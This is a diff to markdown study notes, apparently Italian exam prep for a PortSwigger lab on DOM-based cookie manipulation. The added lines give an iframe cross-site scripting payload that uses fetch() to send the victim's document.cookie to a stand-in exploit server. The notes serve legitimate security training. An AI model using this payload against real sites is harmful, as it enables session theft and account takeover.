@@ -153,6 +153,11 @@ https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.n
 ```html
 <iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x){window.x=1;this.src='https://TARGET/'}">
 ```
+- Payload da esame (esfiltrazione cookie verso un collector/exploit server, invece di chiamare `print()`):
+```html
+<iframe src="https://TARGET.net/product?productId=1&'><script>fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
+</iframe>
+```
 - Link: [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
 - Step: 1
 
